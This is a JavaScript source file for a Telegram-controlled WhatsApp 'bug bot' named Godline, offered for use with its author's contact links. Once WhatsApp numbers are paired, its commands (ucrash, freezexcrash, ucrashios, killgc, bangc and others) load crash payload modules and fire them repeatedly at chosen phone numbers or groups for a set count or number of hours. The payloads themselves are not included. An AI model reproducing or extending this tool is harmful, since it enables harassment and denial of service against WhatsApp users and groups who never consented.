/*
 * © 2026 SeXyxeon (VOIDSEC)
 *
 * ⚠️ COPYRIGHT NOTICE
 * This source code is protected under copyright law.
 * Any form of re-uploading, recoding, modification,
 * selling, or redistribution WITHOUT explicit permission
 * from the original author is strictly prohibited.
 *
 * ❌ NO CREDIT = NO PERMISSION
 * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
 *
 * ✔️ Usage or modification is allowed ONLY
 * with prior permission and proper credit.
 *
 * OFFICIAL LINKS (ONLY):
 * YouTube   : https://youtube.com/@voidsec7718
 * Instagram : sabir._7718
 * Telegram  : https://t.me/SABIR7718
 * GitHub    : https://github.com/SABIR7718
 * WhatsApp  : +91 73650 85213
 *
 * Violations may result in DMCA takedown
 * or termination of the Telegram bot.
 */
 

const fs = require("fs");
const path = require("path");
const TelegramBot = require('node-telegram-bot-api');
const axios = require("axios");
const moment = require("moment-timezone");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    Browsers,
    delay,
    DisconnectReason,
    makeCacheableSignalKeyStore,
    generateWAMessageFromContent,
    makeInMemoryStore
} = require('@poucode/baileys');
const pino = require('pino');

process.on('unhandledRejection', (e) => console.log('[unhandledRejection]', e?.message || e));
process.on('uncaughtException', (e) => console.log('[uncaughtException]', e?.message || e));

const SYLoves = `./SY/S7/`;
const optional = (p) => { try { return require(p) } catch { return null } };

const delayhardLogic  = optional(SYLoves + 'delayhard');
const freezeLogic     = optional(SYLoves + 'freeze');
const forcexLogic     = optional(SYLoves + 'forcex');
const bangcLogic      = optional(SYLoves + 'bangc');
const iosLogic        = optional(SYLoves + 'ios');
const ucrashLogic     = optional(SYLoves + 'ucrash');
const ucrashv2Logic   = optional(SYLoves + 'ucrashv2');
const clickgcLogic    = optional(SYLoves + 'clickgc');

const richxiosLogic    = optional(SYLoves + 'richxios');
const crashfinityLogic = optional(SYLoves + 'crashfinity');
const crashjamLogic    = optional(SYLoves + 'crashjam');
const CrashLogic       = optional(SYLoves + 'Crash');
const XgcLogic         = optional(SYLoves + 'Xgc');
const gcFrzLogic       = optional(SYLoves + 'gcFrz');

const botConfig = require('./config');
const S7 = new TelegramBot(botConfig.token, { polling: true });
const store = makeInMemoryStore({ logger: pino({ level: 'silent' }) });

let SYxS7 = null;
const waSessions = {};
const commandMap = new Map();

const AUTH_ROOT = path.join(__dirname, 'Love', 'auth');
const DATA_FILE = path.join(__dirname, 'Love', 'data.json');
const USER_FILE = path.join(__dirname, 'Love', 'user.json');

if (!fs.existsSync(path.join(__dirname, 'Love'))) fs.mkdirSync(path.join(__dirname, 'Love'), { recursive: true });
if (!fs.existsSync(DATA_FILE)) fs.writeFileSync(DATA_FILE, '{}');
if (!fs.existsSync(USER_FILE)) fs.writeFileSync(USER_FILE, '{}');

function readJson(file, fallback) {
    try { return JSON.parse(fs.readFileSync(file, 'utf8')) } catch { return fallback }
}
function writeJson(file, data) {
    try { fs.writeFileSync(file, JSON.stringify(data, null, 2)) } catch (e) { console.log(e.message) }
}

const LoveGlobalState = (userId) => {
    const users = readJson(USER_FILE, {});
    return !!users[userId]?.started;
};

function BvgSYLoVe(cleanTarget) {
    return `<b>🍃 Godline Bug</b>\n\n<b>Target:</b> <code>${cleanTarget}</code>\n<b>Status:</b> Sending...`;
}

function SYLovesButton(s7CM) {
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: '🛠 Bug Menu', callback_data: 'bug_menu' }],
                [{ text: '📋 My Numbers', callback_data: 'my_numbers' }]
            ]
        }
    };
}

function log(type, who, text) {
    const t = moment().tz('Asia/Jakarta').format('HH:mm:ss');
    console.log(`[${t}] [${type}] ${who} → ${text}`);
}

async function sendSYLove(S7bot, chatId) {
    return S7bot.sendMessage(chatId, `<b>🍃 Welcome to Godline</b>\n\nStart the bot first with /start`, { parse_mode: 'HTML' });
}

/* ---------------- core helpers ---------------- */

async function waExists(client, jid) {
    if (!client?.ws?.isOpen) throw new Error('WhatsApp socket not connected');
    if (typeof client.onWhatsApp !== 'function') return true;
    const res = await client.onWhatsApp(jid);
    const entry = Array.isArray(res) ? res[0] : res;
    if (!entry) return true;
    return entry.exists !== false;
}

function pickMod(mod, fn) {
    if (!mod) throw new Error('Module for this command is missing in SY/S7');
    if (typeof mod[fn] !== 'function') throw new Error(`Function ${fn} not exported`);
    return mod[fn];
}

async function runBugLoop(S7bot, chatId, client, targetJid, fn, mode, value, label) {
    let sent = 0;
    const tick = async () => {
        try { await fn(client, targetJid); sent++; }
        catch (e) { console.log(`[${label}] ${e.message}`); }
    };

    if (mode === 'only') {
        const count = parseInt(value);
        if (!count || count <= 0) return S7bot.sendMessage(chatId, '❌ Invalid count value');
        await tick();
        const iv = setInterval(() => {
            if (sent >= count) return clearInterval(iv);
            tick();
        }, 1500);
    } else {
        const hours = parseFloat(value);
        if (!hours || hours <= 0) return S7bot.sendMessage(chatId, '❌ Invalid time value');
        const end = Date.now() + hours * 3600000;
        await tick();
        const iv = setInterval(() => {
            if (Date.now() >= end) return clearInterval(iv);
            tick();
        }, 1500);
    }
}

function parseTarget(args, wantGroup) {
    if (!args[1]) return null;
    let t = args[1].replace(/[^0-9@g.us]/g, '');
    if (wantGroup) {
        if (!t.endsWith('@g.us')) {
            const digits = t.replace(/[^0-9]/g, '');
            t = `${digits}@g.us`;
        }
        return t;
    }
    const digits = t.replace(/[^0-9]/g, '');
    if (!digits) return null;
    return `${digits}@s.whatsapp.net`;
}

function sessionFor(chatId) {
    const list = waSessions[chatId];
    if (!list?.length) return null;
    return list[Math.floor(Math.random() * list.length)];
}

/* ---------------- socket ---------------- */

async function getMessage(key) {
    try {
        const msg = await store.loadMessage(key.remoteJid, key.id);
        return msg?.message || undefined;
    } catch { return undefined }
}

async function SYlovemeOk(sock) {
    try {
        const data = await sock.query({
            tag: 'iq',
            attrs: { to: 's.whatsapp.net', type: 'get', xmlns: 'w:mex' },
            content: [{
                tag: 'query',
                attrs: { query_id: '7747712715203573' },
                content: new TextEncoder().encode(JSON.stringify({}))
            }]
        });
        if (data) log('newsletter', 'sync', 'ok');
    } catch (e) { console.log('[newsletter]', e.message) }
}

async function StartLovingSY(chatId, phone) {
    const dir = path.join(AUTH_ROOT, chatId, phone);
    fs.mkdirSync(dir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(dir);

    const sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
        },
        printQRInTerminal: false,
        logger: pino({ level: 'silent' }),
        browser: Browsers.ubuntu('Chrome'),
        generateHighQualityLinkPreview: true,
        getMessage,
        syncFullHistory: false,
        markOnlineOnConnect: true
    });

    store.bind(sock.ev);

    if (!waSessions[chatId]) waSessions[chatId] = [];
    waSessions[chatId].push({ num: phone, sock });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            SYxS7 = sock;
            log('connect', phone, 'open');
            await SYlovemeOk(sock);
        }

        if (connection === 'close') {
            const code = lastDisconnect?.error?.output?.statusCode;
            if (code !== DisconnectReason.loggedOut) {
                log('reconnect', phone, `code ${code}`);
                try {
                    waSessions[chatId] = waSessions[chatId].filter((s) => s.num !== phone);
                    await StartLovingSY(chatId, phone);
                } catch (e) { console.log('[reconnect]', e.message) }
            } else {
                log('logout', phone, 'removed');
                waSessions[chatId] = (waSessions[chatId] || []).filter((s) => s.num !== phone);
                try { fs.rmSync(dir, { recursive: true, force: true }) } catch {}
            }
        }
    });

    return sock;
}

async function StartSavingSY(chatId) {
    const dir = path.join(AUTH_ROOT, chatId);
    if (!fs.existsSync(dir)) return [];
    const numbers = fs.readdirSync(dir).filter((n) => /^\d+$/.test(n));
    for (const num of numbers) {
        if ((waSessions[chatId] || []).some((s) => s.num === num)) continue;
        try { await StartLovingSY(chatId, num) } catch (e) { console.log('[restore]', e.message) }
    }
    return numbers;
}

/* ---------------- dispatcher ---------------- */

function SYLoVe(names, handler) {
    for (const n of names) commandMap.set(n.toLowerCase(), handler);
}

S7.on('message', async (msg) => {
    try {
        if (!msg.text || !msg.text.startsWith('/')) return;
        const chatId = msg.chat.id.toString();
        const userId = msg.from.id.toString();
        const args = msg.text.trim().split(/\s+/);
        const cmd = args[0].replace('/', '').toLowerCase();

        const handler = commandMap.get(cmd);
        if (!handler) return;

        const exempt = ['start', 'menu', 'reqpair', 'list', 'delpair'];
        if (!exempt.includes(cmd) && !LoveGlobalState(userId)) {
            return sendSYLove(S7, chatId);
        }

        await handler(msg, chatId, userId, args);
    } catch (e) {
        console.log('[dispatch]', e.message);
        S7.sendMessage(msg.chat.id.toString(), `❌ Error: ${e.message}`).catch(() => {});
    }
});

/* ---------------- commands ---------------- */

SYLoVe(['Start'], async (msg, chatId, userId) => {
    const users = readJson(USER_FILE, {});
    if (!users[userId]) users[userId] = {};
    users[userId].started = true;
    users[userId].name = msg.from.first_name || 'user';
    writeJson(USER_FILE, users);

    await StartSavingSY(chatId);

    return S7.sendMessage(chatId,
        `<b>🍃 Godline</b>\n\nUse /reqpair to connect a number, then /menu.`,
        { parse_mode: 'HTML', ...SYLovesButton('menu').reply_markup ? { reply_markup: SYLovesButton('menu').reply_markup } : {} }
    );
});

SYLoVe(['Menu'], async (msg, chatId) => {
    return S7.sendMessage(chatId,
        `<b>🍃 Godline Menu</b>\n\n/bug — bug commands\n/list — connected numbers\n/reqpair 628xx — pair a number\n/delpair 628xx — remove a number`,
        { parse_mode: 'HTML', reply_markup: SYLovesButton('menu').reply_markup }
    );
});

SYLoVe(['Bug'], async (msg, chatId) => {
    return S7.sendMessage(chatId,
        `<b>🛠 Bug Menu</b>\n\n` +
        `<code>/freezexcrash 62xx 1</code>\n` +
        `<code>/ucrash 62xx 1</code>\n` +
        `<code>/ucrashv2 62xx 1</code>\n` +
        `<code>/delayinvis 62xx 1</code>\n` +
        `<code>/freezeinvis 62xx 1</code>\n` +
        `<code>/ucrashios 62xx 1</code>\n` +
        `<code>/ucrashiosv2 62xx 1</code>\n` +
        `<code>/gcclick 123@g.us</code>\n` +
        `<code>/bangc 123@g.us</code>\n` +
        `<code>/listgc</code>\n\n` +
        `Time slot accepts <b>only N</b> or <b>hours</b>.`,
        { parse_mode: 'HTML' }
    );
});

SYLoVe(['Reqpair', 'Pair'], async (msg, chatId, userId, args) => {
    if (!args[1]) return S7.sendMessage(chatId, '❌ Example: /reqpair 628123456789');
    const phone = args[1].replace(/[^0-9]/g, '');
    if (phone.length < 9) return S7.sendMessage(chatId, '❌ Invalid number');

    await S7.sendMessage(chatId, `⏳ Requesting pairing code for <code>${phone}</code>...`, { parse_mode: 'HTML' });

    const sock = await StartLovingSY(chatId, phone);
    await delay(1500);

    try {
        const code = await sock.requestPairingCode(phone);
        return S7.sendMessage(chatId, `🔑 <b>Pairing code</b>\n\n<code>${code}</code>`, { parse_mode: 'HTML' });
    } catch (e) {
        return S7.sendMessage(chatId, `❌ ${e.message}`);
    }
});

SYLoVe(['List'], async (msg, chatId) => {
    const list = waSessions[chatId] || [];
    if (!list.length) return S7.sendMessage(chatId, '❌ No numbers connected');
    const text = list.map((s, i) => `${i + 1}. <code>${s.num}</code> ${s.sock?.ws?.isOpen ? '🟢' : '🔴'}`).join('\n');
    return S7.sendMessage(chatId, `<b>Connected numbers</b>\n\n${text}`, { parse_mode: 'HTML' });
});

SYLoVe(['Delpair'], async (msg, chatId, userId, args) => {
    if (!args[1]) return S7.sendMessage(chatId, '❌ Example: /delpair 628123456789');
    const phone = args[1].replace(/[^0-9]/g, '');
    const dir = path.join(AUTH_ROOT, chatId, phone);
    if (!fs.existsSync(dir)) return S7.sendMessage(chatId, '❌ Number not found');

    const entry = (waSessions[chatId] || []).find((s) => s.num === phone);
    try { await entry?.sock?.logout() } catch {}
    waSessions[chatId] = (waSessions[chatId] || []).filter((s) => s.num !== phone);
    fs.rmSync(dir, { recursive: true, force: true });

    return S7.sendMessage(chatId, `✅ Removed <code>${phone}</code>`, { parse_mode: 'HTML' });
});

/* ---------------- bug commands ---------------- */

SYLoVe(['FreezexCrash', 'freezexcrash'], async (msg, chatId, userId, args) => {
    const s7CM = args[0].replace('/', '');
    if (!sessionFor(chatId)) return S7.sendMessage(chatId, '❌ No number connected, use /reqpair');
    const targetJid = parseTarget(args);
    if (!targetJid) return S7.sendMessage(chatId, `❌ Example: /${s7CM} 628123456789 1`);

    const cleanTarget = targetJid.split('@')[0];
    const pick = sessionFor(chatId);

    try {
        const fn = pickMod(forcexLogic, 'forcex');
        if (!(await waExists(pick.sock, targetJid))) return S7.sendMessage(chatId, `❌ This number isn't on WhatsApp`);

        log('command', msg.from.first_name, `${s7CM} on ${cleanTarget} via ${pick.num}`);
        S7.sendPhoto(chatId, botConfig.logo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' })
            .catch(() => S7.sendMessage(chatId, BvgSYLoVe(cleanTarget), { parse_mode: 'HTML' }));

        await runBugLoop(S7, chatId, pick.sock, targetJid, fn, args[2], args[3], 'forcex');
    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

SYLoVe(['Ucrash', 'ucrash'], async (msg, chatId, userId, args) => {
    const s7CM = args[0].replace('/', '');
    if (!sessionFor(chatId)) return S7.sendMessage(chatId, '❌ No number connected, use /reqpair');
    const targetJid = parseTarget(args);
    if (!targetJid) return S7.sendMessage(chatId, `❌ Example: /${s7CM} 628123456789 1`);

    const cleanTarget = targetJid.split('@')[0];
    const pick = sessionFor(chatId);

    try {
        const fn = pickMod(ucrashLogic, 'ucrash');
        if (!(await waExists(pick.sock, targetJid))) return S7.sendMessage(chatId, `❌ This number isn't on WhatsApp`);

        log('command', msg.from.first_name, `${s7CM} on ${cleanTarget} via ${pick.num}`);
        S7.sendPhoto(chatId, botConfig.logo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' })
            .catch(() => S7.sendMessage(chatId, BvgSYLoVe(cleanTarget), { parse_mode: 'HTML' }));

        await runBugLoop(S7, chatId, pick.sock, targetJid, fn, args[2], args[3], 'ucrash');
    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

SYLoVe(['Ucrashv2', 'ucrashv2'], async (msg, chatId, userId, args) => {
    const s7CM = args[0].replace('/', '');
    if (!sessionFor(chatId)) return S7.sendMessage(chatId, '❌ No number connected, use /reqpair');
    const targetJid = parseTarget(args);
    if (!targetJid) return S7.sendMessage(chatId, `❌ Example: /${s7CM} 628123456789 1`);

    const cleanTarget = targetJid.split('@')[0];
    const pick = sessionFor(chatId);

    try {
        const fn = pickMod(ucrashv2Logic, 'ucrashv2');
        if (!(await waExists(pick.sock, targetJid))) return S7.sendMessage(chatId, `❌ This number isn't on WhatsApp`);

        log('command', msg.from.first_name, `${s7CM} on ${cleanTarget} via ${pick.num}`);
        S7.sendPhoto(chatId, botConfig.logo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' })
            .catch(() => S7.sendMessage(chatId, BvgSYLoVe(cleanTarget), { parse_mode: 'HTML' }));

        await runBugLoop(S7, chatId, pick.sock, targetJid, fn, args[2], args[3], 'ucrashv2');
    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

SYLoVe(['DelayInvis', 'delayinvis'], async (msg, chatId, userId, args) => {
    const s7CM = args[0].replace('/', '');
    if (!sessionFor(chatId)) return S7.sendMessage(chatId, '❌ No number connected, use /reqpair');
    const targetJid = parseTarget(args);
    if (!targetJid) return S7.sendMessage(chatId, `❌ Example: /${s7CM} 628123456789 1`);

    const cleanTarget = targetJid.split('@')[0];
    const pick = sessionFor(chatId);

    try {
        const fn = pickMod(delayhardLogic, 'delayhard');
        if (!(await waExists(pick.sock, targetJid))) return S7.sendMessage(chatId, `❌ This number isn't on WhatsApp`);

        log('command', msg.from.first_name, `${s7CM} on ${cleanTarget} via ${pick.num}`);
        S7.sendPhoto(chatId, botConfig.logo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' })
            .catch(() => S7.sendMessage(chatId, BvgSYLoVe(cleanTarget), { parse_mode: 'HTML' }));

        await runBugLoop(S7, chatId, pick.sock, targetJid, fn, args[2], args[3], 'delayhard');
    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

SYLoVe(['FreezeInvis', 'freezeinvis'], async (msg, chatId, userId, args) => {
    const s7CM = args[0].replace('/', '');
    if (!sessionFor(chatId)) return S7.sendMessage(chatId, '❌ No number connected, use /reqpair');
    const targetJid = parseTarget(args);
    if (!targetJid) return S7.sendMessage(chatId, `❌ Example: /${s7CM} 628123456789 1`);

    const cleanTarget = targetJid.split('@')[0];
    const pick = sessionFor(chatId);

    try {
        const fn = pickMod(freezeLogic, 'freeze');
        if (!(await waExists(pick.sock, targetJid))) return S7.sendMessage(chatId, `❌ This number isn't on WhatsApp`);

        log('command', msg.from.first_name, `${s7CM} on ${cleanTarget} via ${pick.num}`);
        S7.sendPhoto(chatId, botConfig.logo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' })
            .catch(() => S7.sendMessage(chatId, BvgSYLoVe(cleanTarget), { parse_mode: 'HTML' }));

        await runBugLoop(S7, chatId, pick.sock, targetJid, fn, args[2], args[3], 'freeze');
    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

SYLoVe(['Ucrashios', 'ucrashios', 'Ucrashiosv2', 'ucrashiosv2'], async (msg, chatId, userId, args) => {
    const s7CM = args[0].replace('/', '');
    if (!sessionFor(chatId)) return S7.sendMessage(chatId, '❌ No number connected, use /reqpair');
    const targetJid = parseTarget(args);
    if (!targetJid) return S7.sendMessage(chatId, `❌ Example: /${s7CM} 628123456789 1`);

    const cleanTarget = targetJid.split('@')[0];
    const pick = sessionFor(chatId);

    try {
        const fn = pickMod(iosLogic, 'ios');
        if (!(await waExists(pick.sock, targetJid))) return S7.sendMessage(chatId, `❌ This number isn't on WhatsApp`);

        log('command', msg.from.first_name, `${s7CM} on ${cleanTarget} via ${pick.num}`);
        S7.sendPhoto(chatId, botConfig.logo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' })
            .catch(() => S7.sendMessage(chatId, BvgSYLoVe(cleanTarget), { parse_mode: 'HTML' }));

        await runBugLoop(S7, chatId, pick.sock, targetJid, fn, args[2], args[3], 'ios');
    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

SYLoVe(['Hidenseek', 'hidenseek'], async (msg, chatId, userId, args) => {
    const s7CM = args[0].replace('/', '');
    if (!sessionFor(chatId)) return S7.sendMessage(chatId, '❌ No number connected, use /reqpair');
    const targetJid = parseTarget(args);
    if (!targetJid) return S7.sendMessage(chatId, `❌ Example: /${s7CM} 628123456789 1`);

    const cleanTarget = targetJid.split('@')[0];
    const pick = sessionFor(chatId);

    try {
        const fn = pickMod(richxiosLogic, 'richxios');
        if (!(await waExists(pick.sock, targetJid))) return S7.sendMessage(chatId, `❌ This number isn't on WhatsApp`);

        log('command', msg.from.first_name, `${s7CM} on ${cleanTarget} via ${pick.num}`);
        await runBugLoop(S7, chatId, pick.sock, targetJid, fn, args[2], args[3], 'richxios');
    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

SYLoVe(['ShamrezxForce', 'shamrezxforce'], async (msg, chatId, userId, args) => {
    const s7CM = args[0].replace('/', '');
    if (!sessionFor(chatId)) return S7.sendMessage(chatId, '❌ No number connected, use /reqpair');
    const targetJid = parseTarget(args);
    if (!targetJid) return S7.sendMessage(chatId, `❌ Example: /${s7CM} 628123456789 1`);

    const pick = sessionFor(chatId);

    try {
        const fn = pickMod(crashfinityLogic, 'crashfinity');
        if (!(await waExists(pick.sock, targetJid))) return S7.sendMessage(chatId, `❌ This number isn't on WhatsApp`);

        log('command', msg.from.first_name, `${s7CM} via ${pick.num}`);
        await runBugLoop(S7, chatId, pick.sock, targetJid, fn, args[2], args[3], 'crashfinity');
    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

SYLoVe(['ShamrezxForceFast', 'shamrezxforcefast'], async (msg, chatId, userId, args) => {
    const s7CM = args[0].replace('/', '');
    if (!sessionFor(chatId)) return S7.sendMessage(chatId, '❌ No number connected, use /reqpair');
    const targetJid = parseTarget(args);
    if (!targetJid) return S7.sendMessage(chatId, `❌ Example: /${s7CM} 628123456789 1`);

    const pick = sessionFor(chatId);

    try {
        const fn = pickMod(crashjamLogic, 'crashjam');
        if (!(await waExists(pick.sock, targetJid))) return S7.sendMessage(chatId, `❌ This number isn't on WhatsApp`);

        log('command', msg.from.first_name, `${s7CM} via ${pick.num}`);
        await runBugLoop(S7, chatId, pick.sock, targetJid, fn, args[2], args[3], 'crashjam');
    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

SYLoVe(['ShamrezNewxForce', 'shamreznewxforce'], async (msg, chatId, userId, args) => {
    const s7CM = args[0].replace('/', '');
    if (!sessionFor(chatId)) return S7.sendMessage(chatId, '❌ No number connected, use /reqpair');
    const targetJid = parseTarget(args);
    if (!targetJid) return S7.sendMessage(chatId, `❌ Example: /${s7CM} 628123456789 1`);

    const pick = sessionFor(chatId);

    try {
        const fn = pickMod(CrashLogic, 'crashfinity');
        if (!(await waExists(pick.sock, targetJid))) return S7.sendMessage(chatId, `❌ This number isn't on WhatsApp`);

        log('command', msg.from.first_name, `${s7CM} via ${pick.num}`);
        await runBugLoop(S7, chatId, pick.sock, targetJid, fn, args[2], args[3], 'Crash');
    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

SYLoVe(['Groupui', 'groupui'], async (msg, chatId, userId, args) => {
    const s7CM = args[0].replace('/', '');
    if (!sessionFor(chatId)) return S7.sendMessage(chatId, '❌ No number connected, use /reqpair');
    const targetJid = parseTarget(args, true);
    if (!targetJid) return S7.sendMessage(chatId, `❌ Example: /${s7CM} 120363xxxx@g.us`);

    const pick = sessionFor(chatId);

    try {
        const fn = pickMod(XgcLogic, 'Xgc');
        log('command', msg.from.first_name, `${s7CM} on ${targetJid} via ${pick.num}`);
        await runBugLoop(S7, chatId, pick.sock, targetJid, fn, args[2], args[3], 'Xgc');
    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

SYLoVe(['Killgc', 'killgc', 'Groupfriz', 'groupfriz'], async (msg, chatId, userId, args) => {
    const s7CM = args[0].replace('/', '');
    if (!sessionFor(chatId)) return S7.sendMessage(chatId, '❌ No number connected, use /reqpair');
    const targetJid = parseTarget(args, true);
    if (!targetJid) return S7.sendMessage(chatId, `❌ Example: /${s7CM} 120363xxxx@g.us`);

    const pick = sessionFor(chatId);

    try {
        const fn = pickMod(gcFrzLogic, 'gcFrz');
        log('command', msg.from.first_name, `${s7CM} on ${targetJid} via ${pick.num}`);
        await runBugLoop(S7, chatId, pick.sock, targetJid, fn, args[2], args[3], 'gcFrz');
    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

SYLoVe(['Gcclick', 'gcclick'], async (msg, chatId, userId, args) => {
    const s7CM = args[0].replace('/', '');
    if (!sessionFor(chatId)) return S7.sendMessage(chatId, '❌ No number connected, use /reqpair');
    const targetJid = parseTarget(args, true);
    if (!targetJid) return S7.sendMessage(chatId, `❌ Example: /${s7CM} 120363xxxx@g.us`);

    const pick = sessionFor(chatId);

    try {
        const fn = pickMod(clickgcLogic, 'clickgc');
        log('command', msg.from.first_name, `${s7CM} on ${targetJid} via ${pick.num}`);
        await S7.sendMessage(chatId, `⏳ Clicking <code>${targetJid}</code>...`, { parse_mode: 'HTML' });

        await fn(pick.sock, targetJid);
        await S7.sendMessage(chatId, `✅ <b>Clicked</b>\n\nTarget: <code>${targetJid}</code>`, { parse_mode: 'HTML' });
    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

SYLoVe(['Bangc', 'bangc'], async (msg, chatId, userId, args) => {
    const s7CM = args[0].replace('/', '');
    if (!sessionFor(chatId)) return S7.sendMessage(chatId, '❌ No number connected, use /reqpair');
    if (!args[1]) return S7.sendMessage(chatId, `❌ Example: /${s7CM} 120363xxxx@g.us`);

    let targetJid = args[1].replace(/[^0-9]/g, '') + '@g.us';
    if (args[1].includes('@g.us')) targetJid = args[1];

    const pick = sessionFor(chatId);

    try {
        const fn = pickMod(bangcLogic, 'bangc');
        log('command', msg.from.first_name, `${s7CM} on ${targetJid} via ${pick.num}`);
        await S7.sendMessage(chatId, `⏳ Banning <code>${targetJid}</code>...`, { parse_mode: 'HTML' });

        await fn(pick.sock, targetJid);
        await S7.sendMessage(chatId, `✅ <b>Successfully banned the group</b>\n\nTarget: <code>${targetJid}</code>`, { parse_mode: 'HTML' });
    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

SYLoVe(['Listgc', 'listgc'], async (msg, chatId) => {
    const pick = sessionFor(chatId);
    if (!pick) return S7.sendMessage(chatId, '❌ No number connected, use /reqpair');

    try {
        await S7.sendMessage(chatId, '⏳ Fetching groups...');
        const groups = await pick.sock.groupFetchAllParticipating();
        const list = Object.values(groups || {});

        if (!list.length) return S7.sendMessage(chatId, '❌ No groups found');

        const text = list.slice(0, 40)
            .map((g, i) => `${i + 1}. <b>${g.subject}</b>\n<code>${g.id}</code> (${g.size || g.participants?.length || 0})`)
            .join('\n\n');

        return S7.sendMessage(chatId, `<b>Groups (${list.length})</b>\n\n${text}`, { parse_mode: 'HTML' });
    } catch (err) {
        return S7.sendMessage(chatId, `❌ ${err.message}`);
    }
});

/* ---------------- callbacks ---------------- */

S7.on('callback_query', async (q) => {
    const chatId = q.message.chat.id.toString();
    try {
        if (q.data === 'bug_menu') {
            await S7.sendMessage(chatId, `<b>🛠 Bug Menu</b>\n\nUse /bug to list commands.`, { parse_mode: 'HTML' });
        }
        if (q.data === 'my_numbers') {
            const list = waSessions[chatId] || [];
            await S7.sendMessage(chatId, list.length
                ? list.map((s) => `<code>${s.num}</code>`).join('\n')
                : '❌ No numbers connected', { parse_mode: 'HTML' });
        }
        await S7.answerCallbackQuery(q.id).catch(() => {});
    } catch (e) { console.log('[callback]', e.message) }
});

/* ---------------- boot ---------------- */

async function startSYloveBot() {
    if (!fs.existsSync(AUTH_ROOT)) fs.mkdirSync(AUTH_ROOT, { recursive: true });
    const chats = fs.existsSync(AUTH_ROOT) ? fs.readdirSync(AUTH_ROOT).filter((d) => /^\d+$/.test(d)) : [];
    for (const chatId of chats) {
        await StartSavingSY(chatId);
    }
    console.log('🍃 Godline started');
}

startSYloveBot().catch((e) => console.log('[boot]', e.message));